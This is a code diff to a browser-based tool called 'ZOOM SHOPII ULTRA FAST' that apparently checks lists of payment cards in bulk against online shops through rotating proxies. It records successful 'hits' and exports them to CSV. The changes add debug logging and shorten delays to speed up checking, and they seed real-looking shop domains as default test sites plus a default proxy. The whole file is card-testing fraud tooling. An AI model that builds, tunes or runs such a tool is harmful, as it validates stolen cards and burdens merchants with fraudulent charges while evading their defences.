-                clearTimeout(timeoutId);
-                return response.ok ? { proxy: proxy, status: 'alive' } : { proxy: proxy, status: 'dead' };
-            } catch { return { proxy: proxy, status: 'dead' }; }
         }
 
         // ================================================================
@@ -2070,6 +2237,7 @@
                 }
                 
                 const batch = quickCardsList.slice(i, Math.min(i + batchSize, total));
+                logDebug(`📦 Quick batch ${Math.floor(i/batchSize)+1}: ${batch.length} cards`, 'info');
                 
                 const results = await Promise.all(batch.map(async (line) => {
                     const cardData = parseCardLine(line);
@@ -2150,18 +2318,18 @@
                 updateStats();
                 renderHits();
                 
-                if (!quickStopRequested) await new Promise(r => setTimeout(r, 50));
+                if (!quickStopRequested) await new Promise(r => setTimeout(r, 30));
             }
             
             if (!quickStopRequested && quickCurrentIndex >= total) {
                 quickRunning = false;
                 updateQuickUI('stopped');
                 els.quickStatus.textContent = '✅ Complete!';
-                els.quickStatus.className = 'status-indicator stopped';
+                els.quickStatus.className = 'status-indicator complete';
                 els.quickProgressText.textContent = `${total}/${total} (100%)`;
                 renderQuickResults();
                 updateQuickFilterCounts();
-                alert(`✅ Quick Check complete! Checked: ${total} cards`);
+                logDebug(`✅ Quick check COMPLETE! ${total} cards processed`, 'success');
             }
         }
 
@@ -2198,6 +2366,7 @@
             els.quickProgressText.textContent = `0/${validCards.length}`;
             updateQuickFilterCounts();
             
+            logDebug(`🚀 Starting quick check with ${validCards.length} cards`, 'info');
             await processQuickCheck();
         });
 
@@ -2207,6 +2376,7 @@
                 els.quickStatus.textContent = '⏸️ Paused';
                 els.quickStatus.className = 'status-indicator paused';
                 updateQuickUI('paused');
+                logDebug('⏸️ Paused', 'warning');
             }
         });
 
@@ -2216,6 +2386,7 @@
                 els.quickStatus.textContent = '🔄 Running';
                 els.quickStatus.className = 'status-indicator running';
                 updateQuickUI('running');
+                logDebug('▶️ Resumed', 'info');
                 processQuickCheck();
             }
         });
@@ -2227,6 +2398,7 @@
                 els.quickStatus.textContent = '⏹️ Stopping...';
                 els.quickStatus.className = 'status-indicator stopped';
                 updateQuickUI('stopped');
+                logDebug('⏹️ Stopped by user', 'warning');
             }
         });
 
@@ -2243,6 +2415,7 @@
             updateQuickUI('stopped');
             quickResults = [];
             updateQuickFilterCounts();
+            logDebug('🗑️ Cleared quick results', 'info');
         });
 
         // ================================================================
@@ -2262,6 +2435,7 @@
                 }
                 
                 const batch = massCardsList.slice(i, Math.min(i + batchSize, total));
+                logDebug(`📦 Mass batch ${Math.floor(i/batchSize)+1}: ${batch.length} cards`, 'info');
                 
                 const results = await Promise.all(batch.map(async (line) => {
                     const cardData = parseCardLine(line);
@@ -2354,20 +2528,20 @@
                 updateStats();
                 renderHits();
                 
-                if (!massStopRequested) await new Promise(r => setTimeout(r, 50));
+                if (!massStopRequested) await new Promise(r => setTimeout(r, 30));
             }
             
             if (!massStopRequested && massCurrentIndex >= total) {
                 massRunning = false;
                 updateMassUI('stopped');
                 els.massStatusIndicator.textContent = '✅ Complete!';
-                els.massStatusIndicator.className = 'status-indicator stopped';
+                els.massStatusIndicator.className = 'status-indicator complete';
                 els.massProgressText.textContent = `${total}/${total} (100%)`;
                 els.massStatus.textContent = '✅ Complete! (' + total + ' cards)';
                 els.massProgressFill.style.width = '100%';
                 renderMassResults();
                 updateMassFilterCounts();
-                alert(`✅ Mass Check complete! Checked: ${total} cards`);
+                logDebug(`✅ Mass check COMPLETE! ${total} cards processed`, 'success');
             }
         }
 
@@ -2436,6 +2610,7 @@
                 massResults = [];
                 updateMassFilterCounts();
                 
+                logDebug(`📁 Loaded ${validCards.length} cards from ${file.name}`, 'info');
                 alert(`✅ File loaded! ${validCards.length} valid cards ready. Click "START MASS CHECK" to begin.`);
             };
             reader.readAsText(file);
@@ -2484,6 +2659,7 @@
             els.massProgressText.textContent = `0/${massCardsList.length}`;
             updateMassFilterCounts();
             
+            logDebug(`🚀 Starting mass check with ${massCardsList.length} cards`, 'info');
             await processMassCheck();
         });
 
@@ -2493,6 +2669,7 @@
                 els.massStatusIndicator.textContent = '⏸️ Paused';
                 els.massStatusIndicator.className = 'status-indicator paused';
                 updateMassUI('paused');
+                logDebug('⏸️ Mass check paused', 'warning');
             }
         });
 
@@ -2502,6 +2679,7 @@
                 els.massStatusIndicator.textContent = '🔄 Running';
                 els.massStatusIndicator.className = 'status-indicator running';
                 updateMassUI('running');
+                logDebug('▶️ Mass check resumed', 'info');
                 processMassCheck();
             }
         });
@@ -2513,6 +2691,7 @@
                 els.massStatusIndicator.textContent = '⏹️ Stopping...';
                 els.massStatusIndicator.className = 'status-indicator stopped';
                 updateMassUI('stopped');
+                logDebug('⏹️ Mass check stopped by user', 'warning');
             }
         });
 
@@ -2538,10 +2717,11 @@
             els.massStatusIndicator.className = 'status-indicator stopped';
             updateMassUI('stopped');
             updateMassFilterCounts();
+            logDebug('🗑️ Cleared mass results', 'info');
         });
 
         // ================================================================
-        // SITE MANAGER - UPDATED WITH OBJECTS
+        // SITE MANAGER
         // ================================================================
 
         els.uploadSitesBtn.addEventListener('click', function() {
@@ -2560,6 +2740,7 @@
                 state.sites = [...new Map(state.sites.map(item => [item.url, item])).values()];
                 renderSites();
                 updateStats();
+                logDebug(`🌐 Added ${urls.length} sites`, 'info');
                 alert(`✅ ${urls.length} sites added! Total: ${state.sites.length}`);
                 els.siteFileInput.value = '';
             };
@@ -2580,6 +2761,7 @@
             state.sites = [...new Map(state.sites.map(item => [item.url, item])).values()];
             renderSites();
             updateStats();
+            logDebug(`🌐 Added ${urls.length} manual sites`, 'info');
             alert(`✅ ${urls.length} sites added! Total: ${state.sites.length}`);
             els.manualSites.value = '';
         });
@@ -2619,7 +2801,7 @@
                 els.siteCheckAlive.textContent = alive;
                 els.siteCheckDead.textContent = dead;
                 els.siteCheckTotal.textContent = total;
-                await new Promise(r => setTimeout(r, 50));
+                await new Promise(r => setTimeout(r, 30));
             }
 
             state.sites = aliveSites;
@@ -2636,6 +2818,7 @@
 
             this.disabled = false;
             this.textContent = '🔍 Check & Remove Dead';
+            logDebug(`✅ Site check: ${alive} alive, ${dead} removed`, 'success');
             alert(`✅ Done! ${alive} sites alive, ${dead} removed.`);
         });
 
@@ -2646,13 +2829,14 @@
                     state.sites = [];
                     renderSites();
                     updateStats();
+                    logDebug('🗑️ Cleared all sites', 'info');
                     alert('✅ All sites cleared!');
                 }
             });
         });
 
         // ================================================================
-        // PROXY MANAGER - UPDATED WITH VALIDATION
+        // PROXY MANAGER
         // ================================================================
 
         els.uploadProxiesBtn.addEventListener('click', function() {
@@ -2662,12 +2846,11 @@
             reader.onload = function(e) {
                 const lines = e.target.result.split('\n').map(p => p.trim()).filter(p => p);
                 
-                // 🔥 FILTER: Only keep valid proxy lines
                 const validProxies = lines.filter(line => isValidProxy(line));
                 const invalidCount = lines.length - validProxies.length;
                 
                 if (validProxies.length === 0) {
-                    alert('❌ No valid proxies found in file! Valid format: user:pass@IP:PORT or IP:PORT:USER:PASS');
+                    alert('❌ No valid proxies found in file!\n\nSupported formats:\n• user:pass@host:port\n• host:port:user:pass\n• host:port');
                     return;
                 }
                 
@@ -2685,6 +2868,7 @@
                 state.proxies = [...new Map(state.proxies.map(item => [item.proxy, item])).values()];
                 renderProxies();
                 updateStats();
+                logDebug(`🔌 Added ${validProxies.length} proxies`, 'info');
                 alert(`✅ ${validProxies.length} proxies added! Total: ${state.proxies.length}`);
                 els.proxyFileInput.value = '';
             };
@@ -2696,12 +2880,11 @@
             if (!text.trim()) { alert('Please paste some proxies'); return; }
             const lines = text.split('\n').map(p => p.trim()).filter(p => p);
             
-            // 🔥 FILTER: Only keep valid proxy lines
             const validProxies = lines.filter(line => isValidProxy(line));
             const invalidCount = lines.length - validProxies.length;
             
             if (validProxies.length === 0) {
-                alert('❌ No valid proxies found! Valid format: user:pass@IP:PORT or IP:PORT:USER:PASS');
+                alert('❌ No valid proxies found!\n\nSupported formats:\n• user:pass@host:port\n• host:port:user:pass\n• host:port');
                 return;
             }
             
@@ -2719,6 +2902,7 @@
             state.proxies = [...new Map(state.proxies.map(item => [item.proxy, item])).values()];
             renderProxies();
             updateStats();
+            logDebug(`🔌 Added ${validProxies.length} manual proxies`, 'info');
             alert(`✅ ${validProxies.length} proxies added! Total: ${state.proxies.length}`);
             els.manualProxies.value = '';
         });
@@ -2756,7 +2940,7 @@
                 els.proxyCheckAlive.textContent = alive;
                 els.proxyCheckDead.textContent = dead;
                 els.proxyCheckTotal.textContent = total;
-                await new Promise(r => setTimeout(r, 50));
+                await new Promise(r => setTimeout(r, 30));
             }
 
             state.proxies = aliveProxies;
@@ -2773,6 +2957,7 @@
 
             this.disabled = false;
             this.textContent = '🔍 Check & Remove Dead';
+            logDebug(`✅ Proxy check: ${alive} alive, ${dead} removed`, 'success');
             alert(`✅ Done! ${alive} proxies alive, ${dead} removed.`);
         });
 
@@ -2783,6 +2968,7 @@
                     state.proxies = [];
                     renderProxies();
                     updateStats();
+                    logDebug('🗑️ Cleared all proxies', 'info');
                     alert('✅ All proxies cleared!');
                 }
             });
@@ -2794,6 +2980,7 @@
         els.refreshHitsBtn.addEventListener('click', function() {
             renderFullHitsList();
             renderHits();
+            logDebug('🔄 Refreshed hits', 'info');
         });
 
         els.exportHitsBtn.addEventListener('click', function() {
@@ -2809,6 +2996,7 @@
             a.download = 'hits_' + new Date().toISOString().slice(0, 10) + '.csv';
             a.click();
             URL.revokeObjectURL(url);
+            logDebug(`📥 Exported ${state.hits.length} hits to CSV`, 'info');
         });
 
         els.clearHitsBtn.addEventListener('click', function() {
@@ -2823,6 +3011,7 @@
                     updateStats();
                     renderHits();
                     renderFullHitsList();
+                    logDebug('🗑️ Cleared all hits', 'info');
                     alert('✅ All hits cleared!');
                 }
             });
@@ -2832,17 +3021,49 @@
         // INIT
         // ================================================================
         loadState();
+
+        // Add default sites if none exist
+        if (state.sites.length === 0) {
+            state.sites = [
+                { url: 'slaterocks.com', status: 'ALIVE', price: '0.00', added: new Date().toLocaleDateString() },
+                { url: 'mlmm.de', status: 'ALIVE', price: '0.00', added: new Date().toLocaleDateString() },
+                { url: 'elgranel.com', status: 'ALIVE', price: '0.00', added: new Date().toLocaleDateString() }
+            ];
+            logDebug('🌐 Added default test sites', 'info');
+        }
+
+        // Add default proxy if none exist
+        if (state.proxies.length === 0) {
+            state.proxies = [{
+                proxy: CONFIG.DEFAULT_PROXY,
+                status: 'ALIVE',
+                latency: 'N/A',
+                added: new Date().toLocaleDateString()
+            }];
+            logDebug('🔌 Added default proxy', 'info');
+        }
+
         renderSites();
         renderProxies();
         renderHits();
         renderFullHitsList();
         updateStats();
 
-        console.log('🚀 ZOOM SHOPII ULTRA FAST initialized!');
+        logDebug('🚀 ZOOM SHOPII ULTRA FAST v3.0 FIXED!', 'success');
+        logDebug(`📡 API: ${CONFIG.API_SERVERS[0]}`, 'info');
+        logDebug(`🔑 API Key: ${CONFIG.CHECKER_API_KEY}`, 'info');
+        logDebug(`🔌 Default Proxy: ${CONFIG.DEFAULT_PROXY.substring(0, 30)}...`, 'info');
+        logDebug(`✅ Fixed: site.startsWith error handled`, 'success');
+
+        // Show debug by default
+        toggleDebug();
+
+        console.log('🚀 ZOOM SHOPII ULTRA FAST v3.0 FIXED');
         console.log('📊 State:', state);
         console.log('🌐 Sites:', state.sites.length);
         console.log('🔌 Proxies:', state.proxies.length);
         console.log('🎯 Hits:', state.hits.length);
+        console.log('✅ site.startsWith FIXED!');
     </script>
 
 </body>
